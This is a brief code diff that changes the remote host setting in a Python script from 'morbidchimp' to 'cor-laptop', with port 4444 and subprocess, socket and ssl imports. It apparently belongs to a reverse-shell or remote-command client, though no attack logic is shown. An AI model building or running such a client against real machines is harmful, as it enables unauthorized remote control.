@@ -1,7 +1,7 @@
 from subprocess import call
 from socket import socket
 import ssl, sys
-rhost = "morbidchimp"
+rhost = "cor-laptop"
 rport = 4444
 
 def sendmessage(data):
